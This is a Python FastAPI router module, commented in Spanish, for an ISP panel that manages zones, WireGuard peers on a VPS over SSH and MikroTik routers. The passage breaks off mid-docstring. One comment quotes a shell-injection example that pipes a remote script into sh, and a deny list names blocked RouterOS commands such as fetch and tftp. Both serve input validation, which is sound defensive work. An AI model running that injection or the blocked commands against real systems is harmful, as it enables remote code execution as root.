from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy import case, func
from sqlalchemy.orm import Session
from typing import List, Optional
import subprocess
import ipaddress
import re
import shlex
import socket
import logging
import base64
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import paramiko
from pydantic import BaseModel

from ..database import get_db
from .. import models, schemas
from .auth import get_current_user, require_roles
from ..config import settings

router = APIRouter()
logger = logging.getLogger(__name__)


# ── Utilidades de red ─────────────────────────────────────────────────────────

def ping_host(ip: str, timeout: int = 2) -> bool:
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", str(timeout), ip],
            capture_output=True, timeout=timeout + 2,
        )
        return result.returncode == 0
    except Exception:
        return False


def check_ssh_port(host: str, port: int = 22, timeout: int = 3) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


# ── WireGuard helpers ─────────────────────────────────────────────────────────

# Un peer se considera vivo si saludo hace menos de esto. WireGuard renueva
# el handshake cada ~2 minutos mientras hay trafico, asi que 3 minutos deja
# margen para un saludo perdido sin dar por vivo un tunel caido.
_HANDSHAKE_VIVO_SEGUNDOS = 180

# ── Memoria corta del estado de WireGuard ────────────────────────────────────
#
# `wg show` se pedia en cada apertura de Zonas y de cada ficha de zona, y cada
# vez era una conexion SSH nueva a la VPS. Con una zona daba igual; con quince
# routers, y con la VPS lenta, es un peaje que no compra nada: WireGuard
# renueva el handshake cada ~2 minutos, asi que un dato mas fresco que eso no
# existe. Guardarlo dos minutos no pierde informacion, solo deja de preguntar
# en vano.
#
# Lo que SI cuesta por router son los ping, pero esos salen del servidor de la
# oficina, no de la VPS, y van en paralelo.
_WG_CACHE_SEGUNDOS = 120
# Si la VPS no contesta, el fallo se recuerda poco: lo justo para que una
# pantalla con varias zonas no espere el timeout una vez por zona, sin tardar
# dos minutos en notar que ya volvio.
_WG_CACHE_FALLO_SEGUNDOS = 20
_wg_cache: dict = {"ts": 0.0, "peers": [], "ok": False}
_wg_cache_lock = threading.Lock()


def _peers_con_estado(peers: list[dict]) -> list[dict]:
    """Marca online/offline con la hora de ahora.

    El `online` no se guarda en la memoria, se calcula al devolver: si se
    guardara, un peer leido hace dos minutos seguiria diciendo "en linea"
    comparando contra la hora de entonces, y podria dar por vivo un tunel
    caido hace cinco.
    """
    # time.time() y no datetime.utcnow().timestamp(): el segundo devuelve la
    # hora UTC como si fuera local, asi que en un contenedor con TZ puesta a
    # America/Lima daria cinco horas de diferencia y TODOS los tuneles
    # pareceriam caidos, sin que nada fallara a la vista. Hoy el contenedor
    # va en UTC y el calculo sale bien, pero no quiero que dependa de eso.
    ahora = time.time()
    return [
        dict(p, online=p["last_handshake"] > 0
             and (ahora - p["last_handshake"]) < _HANDSHAKE_VIVO_SEGUNDOS)
        for p in peers
    ]


def _invalidar_wg_cache() -> None:
    """Despues de dar de alta o de baja un peer, lo guardado ya no vale."""
    with _wg_cache_lock:
        _wg_cache.update(ts=0.0, peers=[], ok=False)


def wg_show_dump(forzar: bool = False) -> list[dict]:
    """
    Parsea `wg show wg0 dump` — se ejecuta por SSH en la VPS, porque el
    backend ya no vive en la misma máquina que el túnel WireGuard (esa es
    la VPS; el backend corre en el servidor local de la empresa).
    Retorna lista de peers con: pubkey, endpoint, allowed_ips,
    last_handshake (epoch), rx_bytes, tx_bytes.

    La respuesta se guarda unos minutos (ver arriba). `forzar=True` se salta
    lo guardado: es para cuando alguien pulsa "Comprobar el enlace" a
    proposito y quiere el dato del momento.
    """
    with _wg_cache_lock:
        if not forzar and _wg_cache["ts"]:
            tope = _WG_CACHE_SEGUNDOS if _wg_cache["ok"] else _WG_CACHE_FALLO_SEGUNDOS
            if (time.time() - _wg_cache["ts"]) < tope:
                return _peers_con_estado(_wg_cache["peers"])

    result = _ssh_vps("wg show wg0 dump")
    if not result["ok"]:
        logger.warning("wg show dump falló: %s", result["output"])
        with _wg_cache_lock:
            _wg_cache.update(ts=time.time(), peers=[], ok=False)
        return []

    peers = []
    lines = result["output"].strip().splitlines()
    for line in lines[1:]:   # primera línea = interface
        parts = line.split("\t")
        if len(parts) < 8:
            continue
        pubkey, _psk, endpoint, allowed_ips, last_hs, rx, tx, _ka = parts[:8]
        peers.append({
            "pubkey": pubkey,
            "endpoint": endpoint if endpoint != "(none)" else None,
            "allowed_ips": allowed_ips,
            "last_handshake": int(last_hs),
            "rx_bytes": int(rx),
            "tx_bytes": int(tx),
        })

    with _wg_cache_lock:
        _wg_cache.update(ts=time.time(), peers=peers, ok=True)
    return _peers_con_estado(peers)


def wg_peer_status(pubkey: str, forzar: bool = False) -> Optional[dict]:
    """Retorna el estado del peer con esa clave pública, o None si no existe."""
    for p in wg_show_dump(forzar=forzar):
        if p["pubkey"] == pubkey:
            return p
    return None


# ── Lo que se le puede pasar a `wg set` ──────────────────────────────────────
#
# Esto no es cosmética ni validación de formulario: todo lo que entra aquí
# termina dentro de una línea de comando que se ejecuta COMO ROOT en la VPS,
# la máquina que guarda los túneles de todas las zonas y la llave con la que
# se entra a cada MikroTik. Sin estas comprobaciones, una clave pública como
#     x;curl http://donde-sea/s.sh|sh;#
# no configura ningún peer: ejecuta ese comando en la VPS. Y la clave llega
# como un parámetro de la petición, escrito por quien llama al endpoint.
#
# Por eso se valida aquí, en la función que arma el comando, y no (solo) en
# el endpoint: así ningún camino nuevo que llame a wg_add_peer/wg_remove_peer
# puede saltarse la comprobación sin darse cuenta.

# Una clave pública de WireGuard son 32 bytes en base64: 43 caracteres del
# alfabeto base64 y el '=' de relleno final. Nada más cabe.
_WG_PUBKEY_RE = re.compile(r'^[A-Za-z0-9+/]{43}=$')


def _validar_pubkey(pubkey: str) -> str:
    limpio = (pubkey or "").strip()
    if not _WG_PUBKEY_RE.match(limpio):
        raise HTTPException(
            status_code=400,
            detail="La clave pública de WireGuard no tiene el formato correcto: son 44 "
                   "caracteres en base64, los que imprime `wg genkey | wg pubkey` (o "
                   "`/interface/wireguard print` en el MikroTik).",
        )
    return limpio


def _validar_allowed_ips(allowed_ips: str) -> str:
    """Las redes del peer, comprobadas una por una con ipaddress.

    Devuelve la lista normalizada y sin espacios, que es como la espera
    `wg set`. Normalizar de paso arregla un error fácil de cometer a mano:
    192.168.80.1/24 se guarda como 192.168.80.0/24, que es lo que se quería
    decir.
    """
    redes = []
    for trozo in (allowed_ips or "").split(","):
        trozo = trozo.strip()
        if not trozo:
            continue
        try:
            redes.append(str(ipaddress.ip_network(trozo, strict=False)))
        except ValueError:
            raise HTTPException(
                status_code=400,
                detail=f"«{trozo}» no es una red válida. Se esperaba algo como "
                       "10.10.0.2/32 o 192.168.80.0/24.",
            ) from None
    if not redes:
        raise HTTPException(
            status_code=400,
            detail="El peer necesita al menos una red en allowed-ips.",
        )
    return ",".join(redes)


def _comentario_de_peer(comment: str) -> str:
    """El comentario del bloque [Peer], en una sola línea.

    Va en base64 hacia la VPS, así que no puede ejecutar nada; pero un nombre
    de zona con un salto de línea partiría el bloque en dos y dejaría el
    wg0.conf mal formado, que es su propia manera de romper el túnel.
    """
    return " ".join((comment or "").split())[:80]


def wg_add_peer(pubkey: str, allowed_ips: str, comment: str = "") -> dict:
    """Agrega peer al wg0.conf de la VPS y lo aplica con wg set — todo por
    SSH, porque el backend corre en el servidor local, no en la VPS."""
    pubkey = _validar_pubkey(pubkey)
    allowed_ips = _validar_allowed_ips(allowed_ips)
    comment = _comentario_de_peer(comment)
    conf_path = settings.WG_CONFIG_PATH
    # Entre comillas para el shell remoto: la ruta sale de la configuración,
    # no de la petición, pero un espacio en ella rompería el comando.
    conf_q = shlex.quote(conf_path)

    leido = _ssh_vps(f"cat {conf_q}")
    if not leido["ok"]:
        return {"ok": False, "error": f"No se pudo leer {conf_path} en la VPS: {leido['output']}"}
    content = leido["output"]

    if pubkey in content:
        # El peer ya fue agregado manualmente (por consola).
        # Solo registrar la clave en BD sin tocar el archivo.
        return {"ok": True, "already_existed": True}

    # Construir bloque [Peer]
    block = "\n[Peer]\n"
    if comment:
        block += f"# {comment}\n"
    block += f"PublicKey = {pubkey}\n"
    block += f"AllowedIPs = {allowed_ips}\n"
    block += "PersistentKeepalive = 25\n"

    # Va codificado en base64 para no pelear con comillas/espacios al pasar
    # el bloque como una sola línea de comando remoto.
    b64_block = base64.b64encode(block.encode()).decode()
    escrito = _ssh_vps(f"echo {b64_block} | base64 -d >> {conf_q}")
    if not escrito["ok"]:
        return {"ok": False, "error": f"Error escribiendo config en la VPS: {escrito['output']}"}

    # Aplicar sin reiniciar. pubkey y allowed_ips ya vienen validados arriba:
    # son base64 de 44 caracteres y una lista de redes normalizada por
    # ipaddress, así que no hay nada que el shell pueda interpretar.
    aplicado = _ssh_vps(f"wg set wg0 peer {pubkey} allowed-ips {allowed_ips}")
    if not aplicado["ok"]:
        return {"ok": False, "error": f"wg set falló: {aplicado['output']}"}
    _invalidar_wg_cache()
    return {"ok": True}


def wg_remove_peer(pubkey: str) -> dict:
    """Elimina peer del wg0.conf de la VPS y de la interfaz activa — por
    SSH, mismo motivo que wg_add_peer."""
    # La clave sale de la base de datos y no de la petición, pero se vuelve a
    # comprobar: si alguna vez entró una fila mal (una migración, una carga a
    # mano, un peer dado de alta antes de que existiera esta validación), el
    # borrado no debe ser el camino por el que se ejecute.
    pubkey = _validar_pubkey(pubkey)
    conf_path = settings.WG_CONFIG_PATH
    conf_q = shlex.quote(conf_path)

    leido = _ssh_vps(f"cat {conf_q}")
    if not leido["ok"]:
        return {"ok": False, "error": f"No se pudo leer {conf_path} en la VPS: {leido['output']}"}
    content = leido["output"]

    if pubkey not in content:
        return {"ok": False, "error": "Peer no encontrado en la configuración"}

    # Eliminar el bloque [Peer] que contiene esta pubkey
    sections = re.split(r"\n(?=\[)", content)
    new_sections = [s for s in sections if pubkey not in s]
    new_content = "\n".join(new_sections)

    b64_content = base64.b64encode(new_content.encode()).decode()
    escrito = _ssh_vps(f"echo {b64_content} | base64 -d > {conf_q}")
    if not escrito["ok"]:
        return {"ok": False, "error": f"Error escribiendo config en la VPS: {escrito['output']}"}

    quitado = _ssh_vps(f"wg set wg0 peer {pubkey} remove")
    if not quitado["ok"]:
        return {"ok": False, "error": f"wg set remove falló: {quitado['output']}"}
    _invalidar_wg_cache()
    return {"ok": True}


# Roles que pueden ver la red por dentro (túnel, router, direcciones IP).
# Atención al cliente, técnicos y vendedoras entran a Zonas para consultar
# cobertura: no necesitan —ni deben recibir— la configuración de la red.
_ROLES_VEN_RED = (
    models.RolUsuario.admin,
)


def _ve_la_red(usuario: Optional[models.Usuario]) -> bool:
    return bool(usuario) and usuario.rol in _ROLES_VEN_RED


def _conteos_por_zona(db: Session) -> dict:
    """Cuántos clientes tiene cada zona, y cuántos están activos.

    Todo en una consulta. Antes se contaba zona por zona, dos consultas por
    cada una: con catorce zonas eran veintiocho viajes a la base solo para
    pintar la lista.
    """
    filas = (
        db.query(
            models.Cliente.zona_id,
            func.count(models.Cliente.id),
            func.count(case((models.Cliente.estado == models.EstadoCliente.activo, 1))),
        )
        .group_by(models.Cliente.zona_id)
        .all()
    )
    return {zona_id: (total, activos) for zona_id, total, activos in filas}


def _zona_to_dict(
    zona,
    db: Session,
    usuario: Optional[models.Usuario] = None,
    conteos: Optional[dict] = None,
) -> dict:
    """La zona tal como la ve `usuario`.

    Los campos de red solo se incluyen para los roles que los administran. No
    basta con esconderlos en la pantalla: si viajan en la respuesta, quedan al
    alcance de cualquiera que mire las peticiones del navegador.
    """
    if conteos is None:
        total = db.query(models.Cliente).filter(models.Cliente.zona_id == zona.id).count()
        activos = db.query(models.Cliente).filter(
            models.Cliente.zona_id == zona.id,
            models.Cliente.estado == models.EstadoCliente.activo,
        ).count()
    else:
        total, activos = conteos.get(zona.id, (0, 0))

    datos = {
        "id": zona.id,
        "nombre": zona.nombre,
        "lat": zona.lat,
        "lng": zona.lng,
        "descripcion": zona.descripcion,
        "tiendas_pago": zona.tiendas_pago,
        "costo_instalacion": zona.costo_instalacion or 0,
        "activo": zona.activo,
        "total_clientes": total,
        "clientes_activos": activos,
    }
    if not _ve_la_red(usuario):
        return datos

    datos.update({
        "ip_wireguard": zona.ip_wireguard,
        "ip_lan": zona.ip_lan,
        "usuario_mikrotik": zona.usuario_mikrotik,
        # La contraseña del router NO sale de aquí. Se guarda y se usa en el
        # servidor; si viajara en la respuesta quedaría en el navegador de
        # cualquiera que abra la lista de zonas. El panel solo la escribe.
        # Se informa si está puesta o no, que es lo único que la pantalla
        # necesita saber para decir "configurada".
        "tiene_password_mikrotik": bool(zona.password_mikrotik),
        "wg_public_key": zona.wg_public_key,
        "router_mikrotik": zona.router_mikrotik,
        "ip_router": zona.ip_router,
        "pool_pppoe": zona.pool_pppoe,
        "lista_corte": zona.lista_corte,
    })
    return datos


# ── Endpoints ─────────────────────────────────────────────────────────────────

@router.get("", response_model=List[dict])
def list_zonas(
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(get_current_user),
):
    zonas = (
        db.query(models.Zona)
        .filter(models.Zona.activo == True)
        .order_by(models.Zona.nombre)
        .all()
    )
    conteos = _conteos_por_zona(db)
    return [_zona_to_dict(z, db, current_user, conteos) for z in zonas]


@router.post("", response_model=schemas.ZonaOut, status_code=201)
def create_zona(
    data: schemas.ZonaCreate,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    if db.query(models.Zona).filter(models.Zona.nombre == data.nombre).first():
        raise HTTPException(status_code=400, detail="Zona ya existe")
    zona = models.Zona(**data.model_dump())
    db.add(zona)
    db.commit()
    db.refresh(zona)
    return zona


@router.get("/publicas", response_model=List[dict])
def list_zonas_publicas(db: Session = Depends(get_db)):
    """Lista pública de zonas con cobertura activa — sin autenticación, para el
    comprobador de cobertura de la página pública. Solo expone id y nombre."""
    zonas = db.query(models.Zona).filter(models.Zona.activo == True).order_by(models.Zona.nombre).all()
    return [{"id": z.id, "nombre": z.nombre} for z in zonas]


@router.get("/publicas/resumen", response_model=dict)
def resumen_publico(db: Session = Depends(get_db)):
    """Cifras reales (no estimadas) para la página pública: cuántas zonas
    activas y cuántos clientes activos hay hoy. Sin autenticación."""
    zonas_activas = db.query(models.Zona).filter(models.Zona.activo == True).count()
    clientes_activos = db.query(models.Cliente).filter(
        models.Cliente.estado == models.EstadoCliente.activo,
    ).count()
    return {"zonas_activas": zonas_activas, "clientes_activos": clientes_activos}


# ── Estado de red de todas las zonas ──────────────────────────────────────────

@router.get("/estado-red", response_model=List[dict])
def estado_red_zonas(
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    """Si el router de cada zona contesta, en una sola llamada.

    La pantalla de zonas pinta una tarjeta por zona y cada tarjeta dice si su
    MikroTik está en línea. Preguntarlo zona por zona serían tantas peticiones
    como zonas, de varios segundos cada una: acá el handshake de WireGuard sale
    de un solo `wg show` en la VPS y los ping van en paralelo, así que toda la
    pantalla tarda lo que la zona más lenta.

    Va declarada antes que /{zona_id} a propósito: FastAPI prueba las rutas en
    el orden en que se declaran, y si no, "estado-red" entraría como si fuera
    el id de una zona.
    """
    zonas = db.query(models.Zona).filter(models.Zona.activo == True).all()

    # Un solo SSH a la VPS trae el handshake de todos los peers.
    peers = {p["pubkey"]: p for p in wg_show_dump()}

    # Se sacan los datos del ORM antes de repartir el trabajo: la sesión de la
    # base no se puede tocar desde varios hilos, y acá ya no hace falta.
    objetivos = [
        {"zona_id": z.id, "ip": z.ip_wireguard, "pubkey": z.wg_public_key}
        for z in zonas
    ]

    def comprobar(objetivo: dict) -> dict:
        peer = peers.get(objetivo["pubkey"]) if objetivo["pubkey"] else None
        wg_online = bool(peer and peer["online"])
        handshake = peer["last_handshake"] if peer else 0

        datos = {
            "zona_id": objetivo["zona_id"],
            "ping_ok": False,
            "ssh_ok": False,
            "wg_online": wg_online,
            "last_handshake_ts": handshake,
        }

        if not objetivo["ip"]:
            # La zona está registrada pero el router todavía no está en sitio.
            datos["estado"] = "sin_tunel"
            return datos

        # Tiempos cortos: acá se comprueban todas las zonas de golpe y la
        # pantalla está esperando. El detalle fino de una zona lo da
        # /{zona_id}/wireguard-status, que sí puede permitirse esperar más.
        datos["ping_ok"] = ping_host(objetivo["ip"], timeout=1)
        datos["ssh_ok"] = check_ssh_port(objetivo["ip"], timeout=2) if datos["ping_ok"] else False

        if datos["ping_ok"]:
            datos["estado"] = "conectado"
        elif wg_online:
            # Handshake reciente pero el router no contesta al ping. Se
            # distingue de "sin respuesta" seco porque el problema está en el
            # router, no en el enlace, y se arregla de otra manera.
            datos["estado"] = "tunel_sin_router"
        else:
            datos["estado"] = "sin_respuesta"
        return datos

    if not objetivos:
        return []

    # Los ping son espera, no cálculo: en paralelo tardan lo que el más lento.
    with ThreadPoolExecutor(max_workers=min(10, len(objetivos))) as pool:
        return list(pool.map(comprobar, objetivos))


@router.get("/{zona_id}", response_model=dict)
def get_zona(
    zona_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(get_current_user),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    return _zona_to_dict(zona, db, current_user)


@router.put("/{zona_id}")
def update_zona(
    zona_id: int,
    data: schemas.ZonaCreate,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    for k, v in data.model_dump().items():
        setattr(zona, k, v)
    db.commit()
    db.refresh(zona)
    return {"ok": True}


@router.put("/{zona_id}/datos", response_model=dict)
def update_zona_datos(
    zona_id: int,
    data: schemas.ZonaDatosUpdate,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    """Corrige nombre/descripción/tiendas de pago, ubicación del servidor
    y las credenciales del MikroTik (usuario, clave, IP LAN, router).

    Existe aparte de PUT /zonas/{id} aunque hoy ambos los use el mismo rol:
    este NO toca el túnel WireGuard. La separación se mantiene porque es la
    diferencia entre equivocarse en un router y dejar sin acceso remoto a
    toda una zona."""
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    update_data = data.model_dump(exclude_unset=True)
    if "nombre" in update_data and update_data["nombre"] != zona.nombre:
        if db.query(models.Zona).filter(models.Zona.nombre == update_data["nombre"]).first():
            raise HTTPException(status_code=400, detail="Ya existe una zona con ese nombre")
    for k, v in update_data.items():
        setattr(zona, k, v)
    db.commit()
    db.refresh(zona)
    return _zona_to_dict(zona, db, current_user)


@router.delete("/{zona_id}")
def delete_zona(
    zona_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    clientes = db.query(models.Cliente).filter(models.Cliente.zona_id == zona_id).count()
    if clientes > 0:
        raise HTTPException(status_code=400, detail=f"No se puede eliminar: tiene {clientes} cliente(s) asignados")
    db.delete(zona)
    db.commit()
    return {"ok": True}


# ── WireGuard status (ping + SSH + WG handshake) ──────────────────────────────

@router.get("/{zona_id}/wireguard-status")
def wireguard_status(
    zona_id: int,
    forzar: bool = False,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")

    if not zona.ip_wireguard:
        raise HTTPException(
            status_code=400,
            detail="Esta zona todavía no tiene túnel WireGuard configurado.",
        )

    ip = zona.ip_wireguard
    ping_ok = ping_host(ip)
    ssh_ok = check_ssh_port(ip) if ping_ok else False

    # Estado WireGuard real desde wg show
    wg_peer = wg_peer_status(zona.wg_public_key, forzar=forzar) if zona.wg_public_key else None

    last_handshake_ts = wg_peer["last_handshake"] if wg_peer else 0
    last_handshake_fmt = (
        datetime.utcfromtimestamp(last_handshake_ts).strftime("%d/%m/%Y %H:%M:%S UTC")
        if last_handshake_ts else "Sin handshake"
    )

    return {
        "zona": zona.nombre,
        "ip": ip,
        "online": ping_ok,
        "ssh_ok": ssh_ok,
        "wg_peer_online": wg_peer["online"] if wg_peer else False,
        "last_handshake": last_handshake_fmt,
        "last_handshake_ts": last_handshake_ts,
        "rx_bytes": wg_peer["rx_bytes"] if wg_peer else 0,
        "tx_bytes": wg_peer["tx_bytes"] if wg_peer else 0,
        "status": "conectado" if ping_ok else "desconectado",
        "vps_pubkey": settings.VPS_WG_PUBKEY,
        "vps_endpoint": f"{settings.VPS_IP}:51820",
    }


# ── WireGuard peer management ─────────────────────────────────────────────────

@router.post("/{zona_id}/wireguard/peer")
def add_wg_peer(
    zona_id: int,
    pubkey: str,
    lan_network: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    """
    Agrega el peer WireGuard de la zona.
    allowed_ips = {ip_wireguard}/32[, {lan_network}]
    Retorna la pubkey del VPS para configurar en el MikroTik.
    """
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")

    if not zona.ip_wireguard:
        raise HTTPException(
            status_code=400,
            detail="Primero asigna una IP de WireGuard a la zona.",
        )

    # Se comprueba antes de hablar con la VPS: así un dato mal escrito da un
    # 400 inmediato en vez de un viaje de ida y vuelta por SSH, y la clave que
    # se guarda abajo es exactamente la que se validó.
    pubkey = _validar_pubkey(pubkey)

    allowed_ips = f"{zona.ip_wireguard}/32"
    if lan_network:
        allowed_ips += f", {lan_network}"
    elif zona.ip_lan:
        # Derivar red /24 desde ip_lan (ej: 192.168.80.1 → 192.168.80.0/24)
        parts = zona.ip_lan.split(".")
        if len(parts) == 4:
            allowed_ips += f", {parts[0]}.{parts[1]}.{parts[2]}.0/24"

    result = wg_add_peer(pubkey, allowed_ips, comment=zona.nombre)
    if not result["ok"]:
        raise HTTPException(status_code=500, detail=result.get("error", "Error WireGuard"))

    # Guardar pubkey en la zona
    zona.wg_public_key = pubkey
    db.commit()

    return {
        "ok": True,
        "vps_pubkey": settings.VPS_WG_PUBKEY,
        "vps_endpoint": f"{settings.VPS_IP}:51820",
        "allowed_ips_configurados": allowed_ips,
        "peer_wg_ip": zona.ip_wireguard,
    }


@router.delete("/{zona_id}/wireguard/peer")
def remove_wg_peer(
    zona_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    if not zona.wg_public_key:
        raise HTTPException(status_code=400, detail="La zona no tiene clave pública WireGuard registrada")

    result = wg_remove_peer(zona.wg_public_key)
    if not result["ok"]:
        raise HTTPException(status_code=500, detail=result.get("error", "Error WireGuard"))

    zona.wg_public_key = None
    db.commit()
    return {"ok": True}


@router.get("/{zona_id}/wireguard/peers-activos")
def wg_peers_activos(
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    """Lista todos los peers activos en wg0 con su estado."""
    return {"peers": wg_show_dump(), "vps_pubkey": settings.VPS_WG_PUBKEY}



# ── Terminal SSH MikroTik ─────────────────────────────────────────────────────

class TerminalCmd(BaseModel):
    cmd: str


def _ssh_vps(cmd: str, timeout: int = 30) -> dict:
    """Un comando en la VPS, donde vive el túnel WireGuard.

    Entra con VPS_SSH_USER y no con SSH_USER: allí hace falta root (wg0.conf
    es 600 de root y `wg set` necesita privilegios de red), mientras que en
    los MikroTik el usuario debe ser uno limitado. Antes compartían variable
    porque el backend corría dentro de la propia VPS y nunca entraba a sí
    mismo por SSH."""
    return _ssh_exec(
        settings.VPS_IP, cmd, timeout=timeout,
        usuario=settings.VPS_SSH_USER or settings.SSH_USER,
    )


def _ssh_exec(host: str, cmd: str, timeout: int = 30, usuario: Optional[str] = None) -> dict:
    """Ejecuta un comando por SSH. Sin `usuario` entra como SSH_USER, que es
    el de los MikroTik; para la VPS se usa _ssh_vps(), que pasa el suyo."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=host,
            username=usuario or settings.SSH_USER,
            key_filename=settings.SSH_KEY_PATH,
            timeout=10,
            look_for_keys=False,
            allow_agent=False,
        )
        _, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode(errors="ignore").strip()
        err = stderr.read().decode(errors="ignore").strip()
        ssh.close()
        output = out if out else (err if err else "(sin salida)")
        return {"ok": True, "output": output}
    except Exception as e:
        logger.warning("SSH terminal %s falló: %s", host, e)
        return {"ok": False, "output": f"Error de conexión: {e}"}


_BLOCKED_CMD_TERMS = {
    "/system reboot", "/system shutdown", "/system reset-configuration",
    "/user", "/ip service", "/tool fetch", "/tool e-mail",
    "/certificate", "execute", "fetch", "tftp",
}


def _is_safe_routeros_cmd(cmd: str) -> bool:
    cmd_lower = cmd.lower()
    for blocked in _BLOCKED_CMD_TERMS:
        if blocked in cmd_lower:
            return False
    return True


@router.post("/{zona_id}/exec")
def exec_terminal(
    zona_id: int,
    body: TerminalCmd,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    if not zona.ip_wireguard:
        raise HTTPException(status_code=400, detail="Zona sin WireGuard configurado")
    cmd = body.cmd.strip()
    if not cmd:
        raise HTTPException(status_code=400, detail="Comando vacío")
    if not _is_safe_routeros_cmd(cmd):
        logger.warning("Comando bloqueado por seguridad — usuario: %s, cmd: %s", current_user.email, cmd)
        raise HTTPException(status_code=400, detail="Comando no permitido por política de seguridad")
    logger.info("Exec terminal — zona: %s, usuario: %s, cmd: %s", zona.nombre, current_user.email, cmd)
    return _ssh_exec(zona.ip_wireguard, cmd)


# ── Asignación de técnicos por zona ───────────────────────────────────────────

@router.get("/{zona_id}/tecnicos", response_model=List[schemas.UsuarioOut])
def list_tecnicos_zona(
    zona_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(
        require_roles(models.RolUsuario.admin)
    ),
):
    """Quién atiende la zona. Solo administración: la ficha de un técnico
    lleva su teléfono, DNI y dirección, que es dato personal del trabajador."""
    tecnico_ids = [
        tz.tecnico_id for tz in
        db.query(models.TecnicoZona).filter(models.TecnicoZona.zona_id == zona_id).all()
    ]
    if not tecnico_ids:
        return []
    return db.query(models.Usuario).filter(models.Usuario.id.in_(tecnico_ids)).all()


@router.post("/{zona_id}/tecnicos/{tecnico_id}", response_model=schemas.TecnicoZonaOut, status_code=201)
def asignar_tecnico_zona(
    zona_id: int,
    tecnico_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    tecnico = db.query(models.Usuario).filter(models.Usuario.id == tecnico_id).first()
    if not tecnico:
        raise HTTPException(status_code=404, detail="Usuario no encontrado")
    if tecnico.rol != models.RolUsuario.tecnico:
        raise HTTPException(status_code=400, detail="El usuario no tiene rol de técnico")

    existente = db.query(models.TecnicoZona).filter(
        models.TecnicoZona.zona_id == zona_id,
        models.TecnicoZona.tecnico_id == tecnico_id,
    ).first()
    if existente:
        return existente

    asignacion = models.TecnicoZona(zona_id=zona_id, tecnico_id=tecnico_id)
    db.add(asignacion)
    db.commit()
    db.refresh(asignacion)
    return asignacion


@router.delete("/{zona_id}/tecnicos/{tecnico_id}")
def quitar_tecnico_zona(
    zona_id: int,
    tecnico_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    asignacion = db.query(models.TecnicoZona).filter(
        models.TecnicoZona.zona_id == zona_id,
        models.TecnicoZona.tecnico_id == tecnico_id,
    ).first()
    if not asignacion:
        raise HTTPException(status_code=404, detail="El técnico no está asignado a esta zona")
    db.delete(asignacion)
    db.commit()
    return {"ok": True}


# ── Leer la configuracion del MikroTik ya conectado ──────────────────────────


def _mk_secciones(salida: str) -> dict:
    """Parte la salida en las secciones marcadas con ###NOMBRE."""
    secciones: dict = {}
    actual = None
    for linea in salida.splitlines():
        limpia = linea.strip()
        if limpia.startswith("###"):
            actual = limpia[3:].strip()
            secciones[actual] = []
        elif actual and limpia:
            secciones[actual].append(limpia)
    return secciones


def _mk_valor(terse: str, clave: str) -> Optional[str]:
    """Saca `clave=valor` de una linea de `print terse`.

    RouterOS no entrecomilla los valores, asi que esto solo vale para valores
    sin espacios (direcciones, nombres de interfaz). Para los que si pueden
    llevarlos —el nombre de una lista del firewall es "CORTE MOROSO"— se pide
    el valor solo, uno por linea, con :foreach.
    """
    m = re.search(rf"\b{re.escape(clave)}=(\S+)", terse)
    return m.group(1) if m else None


@router.get("/{zona_id}/datos-del-router")
def datos_del_router(
    zona_id: int,
    db: Session = Depends(get_db),
    current_user: models.Usuario = Depends(require_roles(models.RolUsuario.admin)),
):
    """Lo que el MikroTik puede decir de si mismo, para no escribirlo a mano.

    Los dos datos que mas importan son el pool PPPoE y la lista de corte,
    porque son los que, mal escritos, no dan error: el cliente se autentica y
    se queda sin IP, o entra en una lista del firewall que ninguna regla
    consulta y sigue navegando sin pagar. Leidos del router no se pueden
